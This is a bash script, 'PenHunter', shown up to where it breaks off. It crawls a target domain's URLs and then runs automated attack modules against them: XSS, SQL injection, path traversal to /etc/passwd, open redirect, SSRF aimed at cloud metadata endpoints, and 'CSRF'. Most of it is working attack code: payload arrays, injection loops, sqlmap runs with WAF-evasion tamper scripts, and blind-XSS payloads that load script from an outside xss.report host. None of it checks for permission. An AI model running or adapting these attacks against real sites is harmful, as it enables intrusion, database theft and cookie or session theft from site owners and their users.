#!/bin/bash
clear
#colors
RED='\033[0;31m'
GREEN='\033[0;32m'
DARK_GREEN='\033[38;5;22m'
BLUE='\033[0;34m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
MAGENTA='\033[0;35m'
GRAY='\033[0;37m'
BROWN='\033[0;33m'
NC='\033[0m'
acsii="

______          _   _             _            
| ___ \        | | | |           | |           
| |_/ /__ _ __ | |_| |_   _ _ __ | |_ ___ _ __ 
|  __/ _ \ '_ \|  _  | | | | '_ \| __/ _ \ '__|
| | |  __/ | | | | | | |_| | | | | ||  __/ |   
\_|  \___|_| |_\_| |_/\__,_|_| |_|\__\___|_|   
                                               
Created by cc1a2b (•ˋ_ˊ•)               v0.1"
echo -e "${RED}${acsii}${NC}"
echo -e "${BLUE}What do you want: \n 1-D for one domain  \n 2-S for subdomain${NC}\n 9-exit(x) to exit"
read -r -p "$(echo -e "${RED}Do you want to test one domain or subdomain: ${NC}")" choice
if [ "$choice" = "one" ] || [ "$choice" = "d" ] || [ "$choice" = "D" ] || [ "$choice" = "1" ]; then
  clear
  echo -e "${DARK_GREEN}${acsii}${NC}"
  # Prompt the user for the domain
  echo -e "${DARK_GREEN}Enter the domain:${NC}"
  read -r domain

  # Validate the input
  if [[ -z "$domain" ]]; then
    echo -e "${RED}No domain provided. Exiting.${NC}"
    exit 1
  fi

  base_dir="penhunter/one"
  target_file="${domain}_urls_targets.txt"
  full_path="$base_dir/$domain"
  full_path_target="$full_path/$target_file"

  if [ -d "$full_path" ]; then
      echo "The directory '$full_path' already exists."
  else

      # Create the directory
      mkdir "$full_path"
      echo "Directory '$full_path' created."
  fi
  trap 'echo -e "\n${YELLOW}(q)uite or (n)ext?${NC}"; read -r answer; if [[ $answer == "q" ]]; then exit; elif [[ $answer == "n" ]]; then skip=true; fi' SIGINT

  perform_task() {
      if [ "$skip" == true ]; then
          skip=false
          return
      fi

      echo -e "${YELLOW}Fetching URLs by katana for ${domain}...${NC}"
      katana -u $domain -silent -d 10 -jc -kf -fx | sed "/\b\(jpg\|png\|svg\|css\|gif\|jpeg\|woff\|woff2\)\b/d" | grep "$domain" | sed -n '/^http/p' | qsreplace '' | anew -q $full_path_target

      echo -e "${YELLOW}Fetching URLs for by wayback ${domain}#..${NC}"
      echo "$domain" | (gau || hakrawler || waybackurls || katana) | sed -n '/^http/p' | grep "$domain" | sed "/\b\(jpg\|png\|svg\|css\|gif\|jpeg\|woff\|woff2\)\b/d" | qsreplace '' | anew -q $full_path_target

      echo -e "${YELLOW}Fetching URLs for by wayback ${domain}##.${NC}"
      echo "$domain" | gau | sed -n '/^http/p' | grep "$domain" | sed "/\b\(jpg\|png\|svg\|css\|gif\|jpeg\|woff\|woff2\)\b/d" | qsreplace '' | anew -q $full_path_target

      echo -e "${YELLOW}Fetching URLs for by wayback ${domain}###${NC}"
      echo "$domain" | gauplus -random-agent -t 10 | sed -n '/^http/p' | grep "$domain" | sed "/\b\(jpg\|png\|svg\|css\|gif\|jpeg\|woff\|woff2\)\b/d" | qsreplace '' | anew -q $full_path_target

      echo -e "${YELLOW}Fetching URLs by web.archive for ${domain}...${NC}"
      curl -s "http://web.archive.org/cdx/search/cdx?url=$domain/*&output=text&fl=original&collapse=urlkey" | grep "$domain" | sed "/\b\(jpg\|png\|svg\|css\|gif\|jpeg\|woff\|woff2\)\b/d" | sed -n '/^http/p' | qsreplace '' | anew -q $full_path_target

      echo -e "${YELLOW}Fetching URLs by gospider for ${domain}...${NC}"
      gospider -s "https://$domain" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" -q | qsreplace '' | anew -q $full_path_target

      echo -e "${YELLOW}Fetching URLs by paramspider for ${domain}...${NC}"
      paramspider -d $domain -o $target_file > /dev/null 2>&1
      cat output/$target_file | grep "$domain" | qsreplace '' | sed -n '/^http/p' | anew -q $full_path_target

      echo -e "${YELLOW}Fetching URLs by cariddi for ${domain}...${NC}"
      echo "$domain" | cariddi -intensive -t 50 -rua 2>/dev/null | sed -e 's/.*: \(https*:\/\/[^ ]*\).*/\1/' | qsreplace ''| anew -q $target_file

      echo -e "${YELLOW}Fetching URLs by online for ${domain}...${NC}"
      echo "https://$domain" | getJS --complete | anew -q $target_file

      echo -e "${YELLOW}Fetching URLs and searching for potential XSS by JS variables for ${domain}...${NC}"
      cat $full_path_target | grep "$domain" | grep -Eiv '(.eot|.jpg|.jpeg|.gif|.css|.tif|.tiff|.png|.ttf|.otf|.woff|.woff2|.ico|.svg|.txt|.pdf)' | while read -r url; do
          vars=$(timeout 10 curl -s "$url" | grep -Eo "var [a-zA-Z0-9]+" | sed -e "s,var,${url}?,g" -e 's/ //g' | grep -Eiv '\.js$|([^.]+)\.js|([^.]+)\.js\.[0-9]+$|([^.]+)\.js[0-9]+$|([^.]+)\.js[a-z][A-Z][0-9]+$' | sed 's/.*/&=/g')
          echo -e "\e$vars"
      done | sed -n '/^http/p' | qsreplace '' | anew -q $full_path_target

      echo -e "${GREEN}Potential XSS targets saved to ${full_path_target}${NC}"
  }

  if [ -f "$full_path_target" ]; then
      echo -e "${YELLOW}Using existing target file: ${full_path_target}${NC}"
  else
      skip=false
      perform_task
  fi
  if [ -f "output/$target_file" ]; then
    cat output/$target_file | grep "$domain" | qsreplace '' | sed -n '/^http/p' | anew -q $full_path_target
    rm output/$target_file
  fi
  total_urls=$(wc -l < "$full_path_target")
  clear
  echo -e "${RED}${acsii}${NC}"
  echo -e "${YELLOW}Using existing target file: ${full_path_target}${NC}"
  echo -e "${YELLOW}Total URLs to process: ${total_urls}${NC}"
  read -r -p "$(echo -e "${RED}Do you want to use Pen hunter(Y/n): ${NC}")" choice
  if [ "$choice" = "Y" ] || [ "$choice" = "y" ]; then
    while true; do
      clear
      echo -e "${GREEN}${acsii}${NC}"
      echo -e "${YELLOW}Using existing target file: ${full_path_target}${NC}"
      echo -e "${RED}Pen Hunter:${NC}${GREEN}\n 1-xss(xs) for XSS (Cross-Site Scripting)${NC}\n${YELLOW} 2-sqli(sq) for SQL Injection${NC}\n${BLUE} 3-lfi(lf) for Local File Inclusion${NC}\n${MAGENTA} 4-redirect(rd) for Open Redirect${NC}\n${CYAN} 5-ssrf(sf) for Server-Side Request Forgery${NC}\n${PURPLE} 6-csrf(cf) for Cross-Site Request Forgery${NC}\n${BROWN} 7-rce(rc) for Remote Code Execution${NC}\n 9-exit(x) to exit"
      read -r -p "$(echo -e "${DARK_GREEN}Choice one: ${NC}")" choice
      if [ "$choice" = "xss" ] || [ "$choice" = "xs" ] || [ "$choice" = "1" ]; then
        while true; do
          clear
          echo -e "${GREEN}${acsii}${NC}"
          echo -e "${YELLOW}Using existing target file: ${full_path_target}${NC}"
          echo -e "${RED}XSS Pen hunter:${NC} ${GREEN}\n 1-Penhunter xss\n 2-dalfox(d) to use dalfox\n 3-bxss(b) to use BXSS more fast\n 4-myxss(M) for advanced take time\n 5-xsstrike(s) for xsstrike with blind${NC}\n 9-(Type 'exit' or 'x' to exit)"
          #tmux new-session -d -s xss
          echo -e "${RED}tmux create session xss to see:${NC} tmux a -t xss "
          read -r -p "$(echo -e "${DARK_GREEN}Choice one: ${NC}")" choice
          if [ "$choice" = "penhunter" ] || [ "$choice" = "p" ] || [ "$choice" = "1" ]; then
            echo -e "${GREEN}Penhunter search for sqli: $full_path_target...wait${NC}"
            #xss payload
            payload='%22%3E%3Cscript%20itworksinallbrowsers%3E%2F%2A%3Cscript%2A%20%2A%2Falert%28123456%29%3C%2Fscript%3E'
            load_urls() {
                mapfile -t urls < "$1"
                echo "${urls[@]}"
            }

            filter_xssd() {
                url="$1"
                if [[ "$url" == *"="* ]]; then
                    echo "$url"
                fi
            }
            
            qsreplace() {
                url="$1"
                echo "${url%%=*}=${payload}"
            }

            check_xss() {
                url="$1"
                response=$(curl -s --max-time 10 "$url")
                result=$(echo "$response" | grep -o "alert(123456)" | wc -l)
                if [ "$result" -gt 0 ]; then
                    echo -e "${RED}Vuln [${result}]:${NC} $url"
                fi
            }
            
            main() {
                url_file="$full_path_target"
                max_concurrent_requests=25
                current_requests=0

                if [ -z "$url_file" ]; then
                    echo -e "No URL list file specified."
                    exit 1
                fi

                urls=($(load_urls "$url_file"))

                if [ ${#urls[@]} -eq 0 ]; then
                    echo -e "No URLs provided to test."
                    exit 1
                fi

                for url in "${urls[@]}"; do
                    filtered_url=$(filter_xssd "$url")
                    if [ -n "$filtered_url" ]; then
                        injected_url=$(qsreplace "$filtered_url")
                        if (( current_requests >= max_concurrent_requests )); then
                            wait -n
                            current_requests=$((current_requests - 1))
                        fi
                        check_xss "$injected_url" &
                        current_requests=$((current_requests + 1))
                    fi
                done

                wait
            }
            main
            read -r -p "$(echo -e "${DARK_GREEN}TO Exit press on x: ${NC}")" choice
            if [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "1" ]; then
              break
            fi
          elif [ "$choice" = "dalfox" ] || [ "$choice" = "d" ] || [ "$choice" = "2" ]; then
            tmux new-session -d -s xss && tmux send-key -t xss "cat $full_path_target | sed -n '/^http/p' | sed -n '/http[s]*:\/\/$domain/p' | sed '/\.js/d' | sed '/\.css/d' | sed '/\b\(jpg\|png\|svg\|css\|gif\|jpeg\|woff\|woff2\)\b/d' | qsreplace '' | anew | grep -Ev '\.(txt|js|pdf|png|jpeg|jpg|json|css)$' | dalfox pipe -b https://xss.report/c/YOUR xss.report -F http://evil.com --ignore-return 404,403 -o $full_path/$domain-dalfox.txt" C-m
          elif [ "$choice" = "bxss" ] || [ "$choice" = "b" ] || [ "$choice" = "3" ]; then
            tmux new-session -d -s xss && tmux split-window -t xss && tmux send-keys -t xss "cat $full_path_target | grep '=' | sed -n '/http[s]*:\/\/$domain/p' | bxss -appendMode -payload '><script src=https://xss.report/c/YOUR xss.report></script>' -parameters | anew -q $full_path/$domain.xss.txt" C-m
          elif [ "$choice" = "myxss" ] || [ "$choice" = "M" ] || [ "$choice" = "4" ]; then
            echo -e "${BLUE}What payloads file: \n 1-N for xss_advanced.txt  \n 2-S for xss_more_advanced.txt \n 3-M for xss.rerport payload${NC}\n9-exit(x) to exit"
            read -r -p "$(echo -e "${DARK_GREEN}Choice one: ${NC}")" choice
            
            case "$choice" in
              "N"|"n"|"1")
                payload_file="penhunter/payload/xss_advanced.txt"
                echo "Selected payload file: $payload_file"
                ;;
              "S"|"s"|"2")
                payload_file="penhunter/payload/xss_more_advanced.txt"
                echo "Selected payload file: $payload_file"
                ;;
              "M"|"m"|"3")
                payload_file="penhunter/payload/xss_payload.txt"
                echo "Selected payload file: $payload_file"
                ;;
              "exit"|"x"|"9")
                echo "Exiting..."
                break
                ;;
              *)
                echo -e "${RED}Invalid choice. Exiting.${NC}"
                break
                ;;
            esac

            total_payloads=$(wc -l < "$payload_file")
            total_urls=$(wc -l < "$full_path_target")
            total_operations=$((total_urls * total_payloads))
            echo -e "${GREEN}Total operations to perform: ${total_operations}${NC}"

            processed_operations=0

            while IFS= read -r payload; do
              while IFS= read -r url; do
                result=$(echo "$url" | sed -e 's/.*: \(https*:\/\/[^ ]*\).*/\1/' | sed -n '/http[s]*:\/\/$domain/p' | sed '/\.js/d' | sed '/\.css/d' | sed '/\.exe/d' | sed  "/\b\(jpg\|png\|svg\|css\|gif\|jpeg\|woff\|woff2\)\b/d" | grep "=" | gf allparam | qsreplace "$payload" | freq | egrep -v 'Not'| grep "http" )
                if [ -n "$result" ]; then
                  echo -e "\n${RED}Vulnerable URL detected: ${GREEN}$result${NC}" | anew $full_path/$domain.xss.txt
                fi

                ((processed_operations++))
                
                percentage=$((processed_operations * 100 / total_operations))
                echo -ne "\r${YELLOW}Total operations to perform: $processed_operations/$total_operations ($percentage%)${NC}"
              done < "$full_path_target"
            done < "$payload_file"
            echo -e "\n${GREEN}Mission Complete :)${NC}"
          elif [ "$choice" = "xsstrike" ] || [ "$choice" = "s" ] || [ "$choice" = "4" ]; then
            tmux new-session -d -s xss && tmux split-window -t xss && tmux send-keys -t xss "xsstrike --seeds $full_path_target -t 10 > $full_path/xsstrike_target.txt" C-m
          elif [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
            echo "Exiting..."
            break
          else
            echo -e "${RED}Invalid choice. Exiting.${NC}"
            break 
          fi
        done
      elif [ "$choice" = "sqli" ] || [ "$choice" = "sq" ] || [ "$choice" = "2" ]; then
        while true; do
          clear
          echo -e "${YELLOW}${acsii}${NC}"
          echo -e "${YELLOW}Using existing target file: ${full_path_target}${NC}"
          echo -e "${RED}sqli Pen hunter:${NC} ${YELLOW}\n 1-Penhunter sqli\n 2-sqlmap(S) to use sqlmap\n 3-ghauri(G) to use ghauri more deep\n 4-mysqli(M) for advanced${NC}\n 9-(Type 'exit' or 'x' to exit)"
          #tmux new-session -d -s sqli
          echo -e "${RED}tmux create session sqli to see:${NC} tmux a -t sqli "
          read -r -p "$(echo -e "${DARK_GREEN}Choice one: ${NC}")" choice
          if [ "$choice" = "penhunter" ] || [ "$choice" = "p" ] || [ "$choice" = "1" ]; then
            echo -e "${GREEN}Penhunter search for sqli: $full_path_target...wait${NC}"
            
            payloads=(
                "'"
                "' OR '1'='1"
                "\" OR \"1\"=\"1"
                "' OR 'a'='a"
                "' AND 1=1--"
                "\" AND 1=1--"
            )
            load_urls() {
                mapfile -t urls < "$1"
                echo "${urls[@]}"
            }
            check_sqli() {
                url="$1"
                if [[ "$url" == *"="* ]]; then
                    for payload in "${payloads[@]}"; do
                        full_url="${url}${payload}"
                        response=$(curl -s --max-time 10 "$full_url")
                        if echo "$response" | grep -qi "you have an error in your sql syntax\|warning: mysql\|Error:\|Warning:\|unclosed quotation mark\|quoted string not properly terminated\|sql error\|database error\|syntax error\|sql exception"; then
                            echo -e "${GREEN}VULN: ${url}${NC}"
                            echo "Injected URL: $full_url"
                            return
                        fi
                    done
                fi
            }
            main() {
                url_file="$full_path_target"
                max_concurrent_requests=25
                current_requests=0

                if [ -z "$url_file" ]; then
                    echo -e "No URL list file specified."
                    exit 1
                fi

                urls=($(load_urls "$url_file"))

                if [ ${#urls[@]} -eq 0 ]; then
                    echo -e "No URLs provided to test."
                    exit 1
                fi

                for url in "${urls[@]}"; do
                    if (( current_requests >= max_concurrent_requests )); then
                        wait -n
                        current_requests=$((current_requests - 1))
                    fi
                    check_sqli "$url" &
                    current_requests=$((current_requests + 1))
                done

                wait
            }
            main
            read -r -p "$(echo -e "${DARK_GREEN}TO Exit press on x: ${NC}")" choice
            if [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "1" ]; then
              break
            fi
          elif [ "$choice" = "sqlmap" ] || [ "$choice" = "S" ] || [ "$choice" = "2" ]; then
            tmux new-session -d -s sqli && tmux split-window -t sqli && tmux send-keys -t sqli "cat $full_path_target | sed -n '/http[s]*:\/\/$domain/p' | gf sqli | sqlmap --batch --output-dir=$full_path/sqlmap --risk=3 --level=3 --dbs --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes  --no-cast --no-escape --threads=10 --fresh-queries --random-agent" C-m
          elif [ "$choice" = "ghauri" ] || [ "$choice" = "G" ] || [ "$choice" = "2" ]; then
            echo -e "${RED}update${NC}" #tmux split-window -t sqli && tmux send-keys -t sqli "cat $full_path_target | grep '=' | bxss -appendMode -payload '><script src=https://xss.report/c/YOUR xss.report></script>' -parameters" C-m
          elif [ "$choice" = "mysqli" ] || [ "$choice" = "M" ] || [ "$choice" = "3" ]; then
            tmux new-session -d -s sqli && tmux split-window -t sqli && tmux send-keys -t sqli "cat $full_path_target | sed -n '/http[s]*:\/\/$domain/p' | gf sqli | python3 sqli/sqli.py -p penhunter/payload/xor.txt -t 10 | anew $full_path/$domain.sqli.txt" C-m
          elif [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
            echo "Exiting..."
            break
          else
            echo -e "${RED}Invalid choice. Exiting.${NC}"
            break 
          fi
        done  
      elif [ "$choice" = "lfi" ] || [ "$choice" = "lf" ] || [ "$choice" = "3" ]; then
        while true; do
          clear
          echo -e "${BLUE}${acsii}${NC}"
          echo -e "${YELLOW}Using existing target file: ${full_path_target}${NC}"
          echo -e "${RED}lfi Pen hunter:${NC} ${BLUE}\n 1-Penhunter lfi\n 2-nuclei(S) to use lfi\n 3-lfibasic(L) to use ghauri more deep\n 4-mysqli(M) for advanced${NC}\n 9-(Type 'exit' or 'x' to exit)"
          #tmux new-session -d -s lfi
          echo -e "${BLUE}tmux create session lfi to see:${NC} tmux a -t lfi "
          #tmux new-session -d -s lfi
          read -r -p "$(echo -e "${DARK_GREEN}Choice one: ${NC}")" choice
          if [ "$choice" = "penhunter" ] || [ "$choice" = "p" ] || [ "$choice" = "1" ]; then
            echo "${GREEN}Penhunter search to lfi: $full_path_target... wait${NC}"
            load_urls() {
                mapfile -t urls < "$1"
                echo "${urls[@]}"
            }


            check_lfi() {
                url="$1"
                if [[ "$url" == *"="* ]]; then
                    modified_url="${url//=/=../../../../../../etc/passwd}"
                    response=$(curl -s --max-time 10 "$modified_url")
                    if echo "$response" | grep -q ":x:"; then
                        echo -e "${GREEN}VULN: ${url}${NC}"
                        echo "Injected URL: $modified_url"
                    fi
                fi
            }

            # Main function
            main() {
                url_file="$full_path_target"
                max_concurrent_requests=25
                current_requests=0

                if [ -z "$url_file" ]; then
                    echo -e "No URL list file specified."
                    exit 1
                fi

                urls=($(load_urls "$url_file"))

                if [ ${#urls[@]} -eq 0 ]; then
                    echo -e "No URLs provided to test."
                    exit 1
                fi

                for url in "${urls[@]}"; do
                    if (( current_requests >= max_concurrent_requests )); then
                        wait -n
                        current_requests=$((current_requests - 1))
                    fi
                    check_lfi "$url" &
                    current_requests=$((current_requests + 1))
                done

                wait
            }
            main
            read -r -p "$(echo -e "${DARK_GREEN}TO Exit press on x: ${NC}")" choice
            if [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "1" ]; then
              break
            fi
          elif [ "$choice" = "nuclei" ] || [ "$choice" = "S" ] || [ "$choice" = "2" ]; then
            tmux split-window -t lfi && tmux send-keys -t lfi "cat $full_path_target | sed -n '/http[s]*:\/\/$domain/p' | nuclei -c 200 -tags lfi -o $full_path/$domain.lfi_nuclei.txt" C-m
          elif [ "$choice" = "lfibasic" ] || [ "$choice" = "L" ] || [ "$choice" = "3" ]; then
            tmux split-window -t lfi && tmux send-keys -t lfi "cat $full_path_target | gf allparam | qsreplace \".%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/passwd\" | xargs -I% -P 25 sh -c 'curl -s \"%\" 2>&1 | grep -Eq \"root|:x:|admin\" && echo \"VULN! %\"'| anew $full_path/$domain.lfi.txt" C-m
          elif [ "$choice" = "mysqli" ] || [ "$choice" = "M" ] || [ "$choice" = "4" ]; then
            tmux split-window -t lfi && tmux send-keys -t lfi "cat $full_path_target | qsreplace '.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/passwd' | httpx -silent -nc -mr 'root:x:' -t 250 | anew $full_path/$domain.lfi.txt" C-m
          elif [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
            echo "Exiting..."
            break
          else
            echo -e "${RED}Invalid choice. Exiting.${NC}"
            break 
          fi
        done 
      elif [ "$choice" = "redirect" ] || [ "$choice" = "rd" ] || [ "$choice" = "4" ]; then
        while true; do
          clear
          echo -e "${MAGENTA}${acsii}${NC}"
          echo -e "${YELLOW}Using existing target file: ${full_path_target}${NC}"
          echo -e "${MAGENTA}Open Redirect Pen Hunter:${NC} ${MAGENTA}\n 1-Pen Hunter redirect\n 2-redirect-checker(R) to use redirect checker\n 3-Manual redirect test(M)\n 9-(Type 'exit' or 'x' to exit)"
          #tmux new-session -d -s redirect
          echo -e "${RED}tmux create session redirect to see:${NC} tmux a -t redirect "
          read -r -p "$(echo -e "${DARK_GREEN}Choice one: ${NC}")" choice
          if [ "$choice" = "penhunter" ] || [ "$choice" = "p" ] || [ "$choice" = "1" ]; then
            echo -e "${GREEN}Penhunter search for open redirects: $full_path_target...wait${NC}"
            
            payloads=(
                "http://evil.com"
                "//evil.com"
                "/\evil.com"
                "/%5Cevil.com"
                "%2Fevil.com"
            )
            load_urls() {
                mapfile -t urls < "$1"
                echo "${urls[@]}"
            }
            check_redirect() {
                url="$1"
                if [[ "$url" == *"="* ]]; then
                    for payload in "${payloads[@]}"; do
                        full_url="${url}${payload}"
                        response=$(curl -s -I --max-time 10 "$full_url" | grep -i "location:")
                        if echo "$response" | grep -qi "evil.com"; then
                            echo -e "${GREEN}VULN: ${url}${NC}"
                            echo "Injected URL: $full_url"
                            return
                        fi
                    done
                fi
            }
            main() {
                url_file="$full_path_target"
                max_concurrent_requests=25
                current_requests=0

                if [ -z "$url_file" ]; then
                    echo -e "No URL list file specified."
                    exit 1
                fi

                urls=($(load_urls "$url_file"))

                if [ ${#urls[@]} -eq 0 ]; then
                    echo -e "No URLs provided to test."
                    exit 1
                fi

                for url in "${urls[@]}"; do
                    if (( current_requests >= max_concurrent_requests )); then
                        wait -n
                        current_requests=$((current_requests - 1))
                    fi
                    check_redirect "$url" &
                    current_requests=$((current_requests + 1))
                done

                wait
            }
            main
            read -r -p "$(echo -e "${DARK_GREEN}TO Exit press on x: ${NC}")" choice
            if [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
              break
            fi
          elif [ "$choice" = "redirect-checker" ] || [ "$choice" = "R" ] || [ "$choice" = "2" ]; then
            tmux new-session -d -s redirect && tmux split-window -t redirect && tmux send-keys -t redirect "cat $full_path_target | while read url; do curl -s -I \"$url\" | grep -i \"location:\"; done" C-m
          elif [ "$choice" = "manual" ] || [ "$choice" = "M" ] || [ "$choice" = "3" ]; then
            read -r -p "$(echo -e "${DARK_GREEN}Enter your payload: ${NC}")" manual_payload
            if [[ -z "$manual_payload" ]]; then
              echo -e "${RED}No payload entered. Exiting.${NC}"
              break
            fi
            echo -e "${GREEN}Manual open redirect test with payload: ${manual_payload}${NC}"
            cat $full_path_target | while read url; do
              full_url="${url}${manual_payload}"
              response=$(curl -s -I --max-time 10 "$full_url" | grep -i "location:")
              if echo "$response" | grep -qi "${manual_payload}"; then
                echo -e "${GREEN}VULN: ${url}${NC}"
                echo "Injected URL: $full_url"
              fi
            done
            read -r -p "$(echo -e "${DARK_GREEN}TO Exit press on x: ${NC}")" choice
            if [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
              break
            fi
          elif [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
            echo "Exiting..."
            break
          else
            echo -e "${RED}Invalid choice. Exiting.${NC}"
            break 
          fi
        done
      elif [ "$choice" = "ssrf" ] || [ "$choice" = "sf" ] || [ "$choice" = "5" ]; then
        while true; do
          clear
          echo -e "${CYAN}${acsii}${NC}"
          echo -e "${YELLOW}Using existing target file: ${full_path_target}${NC}"
          echo -e "${CYAN}SSRF Pen Hunter:${NC} ${CYAN}\n 1-Pen Hunter SSRF\n 2-SSRF-checker(S) to use ssrf checker\n 3-Manual SSRF test(M)\n 9-(Type 'exit' or 'x' to exit)"
          #tmux new-session -d -s ssrf
          echo -e "${RED}tmux create session ssrf to see:${NC} tmux a -t ssrf "
          read -r -p "$(echo -e "${DARK_GREEN}Choice one: ${NC}")" choice
          if [ "$choice" = "penhunter" ] || [ "$choice" = "p" ] || [ "$choice" = "1" ]; then
            echo -e "${GREEN}Penhunter search for SSRF: $full_path_target...wait${NC}"
            
            payloads=(
                "http://localhost:80"
                "http://127.0.0.1:80"
                "http://169.254.169.254/latest/meta-data/"
                "http://[::]:80"
                "http://[::1]:80"
                "file:///etc/passwd"
            )
            load_urls() {
                mapfile -t urls < "$1"
                echo "${urls[@]}"
            }
            check_ssrf() {
                url="$1"
                if [[ "$url" == *"="* ]]; then
                    for payload in "${payloads[@]}"; do
                        full_url="${url}${payload}"
                        response=$(curl -s --max-time 10 "$full_url")
                        if echo "$response" | grep -qi "root:x:0:0"; then
                            echo -e "${GREEN}VULN: ${url}${NC}"
                            echo "Injected URL: $full_url"
                            return
                        fi
                    done
                fi
            }
            main() {
                url_file="$full_path_target"
                max_concurrent_requests=25
                current_requests=0

                if [ -z "$url_file" ]; then
                    echo -e "No URL list file specified."
                    exit 1
                fi

                urls=($(load_urls "$url_file"))

                if [ ${#urls[@]} -eq 0 ]; then
                    echo -e "No URLs provided to test."
                    exit 1
                fi

                for url in "${urls[@]}"; do
                    if (( current_requests >= max_concurrent_requests )); then
                        wait -n
                        current_requests=$((current_requests - 1))
                    fi
                    check_ssrf "$url" &
                    current_requests=$((current_requests + 1))
                done

                wait
            }
            main
            read -r -p "$(echo -e "${DARK_GREEN}TO Exit press on x: ${NC}")" choice
            if [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
              break
            fi
          elif [ "$choice" = "ssrf-checker" ] || [ "$choice" = "S" ] || [ "$choice" = "2" ]; then
            tmux new-session -d -s ssrf && tmux split-window -t ssrf && tmux send-keys -t ssrf "cat $full_path_target | while read url; do curl -s -I \"$url\" | grep -i \"location:\"; done" C-m
          elif [ "$choice" = "manual" ] || [ "$choice" = "M" ] || [ "$choice" = "3" ]; then
            read -r -p "$(echo -e "${DARK_GREEN}Enter your payload: ${NC}")" manual_payload
            if [[ -z "$manual_payload" ]]; then
              echo -e "${RED}No payload entered. Exiting.${NC}"
              break
            fi
            echo -e "${GREEN}Manual SSRF test with payload: ${manual_payload}${NC}"
            cat $full_path_target | while read url; do
              full_url="${url}${manual_payload}"
              response=$(curl -s --max-time 10 "$full_url")
              if echo "$response" | grep -qi "${manual_payload}"; then
                echo -e "${GREEN}VULN: ${url}${NC}"
                echo "Injected URL: $full_url"
              fi
            done
            read -r -p "$(echo -e "${DARK_GREEN}TO Exit press on x: ${NC}")" choice
            if [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
              break
            fi
          elif [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
            echo "Exiting..."
            break
          else
            echo -e "${RED}Invalid choice. Exiting.${NC}"
            break 
          fi
        done
      elif [ "$choice" = "csrf" ] || [ "$choice" = "cf" ] || [ "$choice" = "6" ]; then
        while true; do
          clear
          echo -e "${PURPLE}${acsii}${NC}"
          echo -e "${YELLOW}Using existing target file: ${full_path_target}${NC}"
          echo -e "${PURPLE}CSRF Pen Hunter:${NC} ${PURPLE}\n 1-Pen Hunter CSRF\n 2-CSRF-Tester(T) to use a CSRF testing tool\n 3-Manual CSRF test(M)\n 9-(Type 'exit' or 'x' to exit)"
          #tmux new-session -d -s csrf
          echo -e "${RED}tmux create session csrf to see:${NC} tmux a -t csrf "
          read -r -p "$(echo -e "${DARK_GREEN}Choice one: ${NC}")" choice
          if [ "$choice" = "penhunter" ] || [ "$choice" = "p" ] || [ "$choice" = "1" ]; then
            echo -e "${GREEN}Penhunter search for CSRF: $full_path_target...wait${NC}"

            payloads=(
                '<script src=https://xss.report/c/YOUR xss.report></script>'
                '<img src=https://xss.report/c/YOUR xss.report onerror=alert(1);>'
                '<img src=https://xss.report/c/YOUR xss.report id=YOUR xss.report'
                '<input onfocus=eval(atob(this.id)) id=YOUR xss.report'
                '<video><source onerror=eval(atob(this.id)) id=YOUR xss.report'
                '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", //x>'
                '<script>$.getScript("//xss.report/c/YOUR xss.report")</script>'
                'var a=document.createElement(script);a.src=https://xss.report/c/YOUR xss.report;document.body.appendChild(a;'
                '<input onfocus=eval(atob(this.id)) id=YOUR xss.report; autofocus>'
            )
            
            load_urls() {
                mapfile -t urls < "$1"
                echo "${urls[@]}"
            }
            
            check_csrf() {
                url="$1"
                for payload in "${payloads[@]}"; do
                    full_url="${url}${payload}"
                    response=$(curl -s --max-time 10 -d "$payload" "$full_url")
                    if echo "$response" | grep -qi "success\|completed"; then
                        echo -e "${GREEN}VULN: ${url}${NC}"
                        echo "Injected URL: $full_url"
                        return
                    fi
                done
            }
            
            main() {
                url_file="$full_path_target"
                max_concurrent_requests=25
                current_requests=0

                if [ -z "$url_file" ]; then
                    echo -e "No URL list file specified."
                    exit 1
                fi

                urls=($(load_urls "$url_file"))

                if [ ${#urls[@]} -eq 0 ]; then
                    echo -e "No URLs provided to test."
                    exit 1
                fi

                for url in "${urls[@]}"; do
                    if (( current_requests >= max_concurrent_requests )); then
                        wait -n
                        current_requests=$((current_requests - 1))
                    fi
                    check_csrf "$url" &
                    current_requests=$((current_requests + 1))
                done

                wait
            }
            main
            read -r -p "$(echo -e "${DARK_GREEN}TO Exit press on x: ${NC}")" choice
            if [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
              break
            fi
          elif [ "$choice" = "csrf-tester" ] || [ "$choice" = "T" ] || [ "$choice" = "2" ]; then
            tmux new-session -d -s csrf && tmux split-window -t csrf && tmux send-keys -t csrf "cat $full_path_target | while read url; do curl -s -I \"$url\" | grep -i \"csrf_token\"; done" C-m
          elif [ "$choice" = "manual" ] || [ "$choice" = "M" ] || [ "$choice" = "3" ]; then
            read -r -p "$(echo -e "${DARK_GREEN}Enter your payload: ${NC}")" manual_payload
            if [[ -z "$manual_payload" ]]; then
              echo -e "${RED}No payload entered. Exiting.${NC}"
              break
            fi
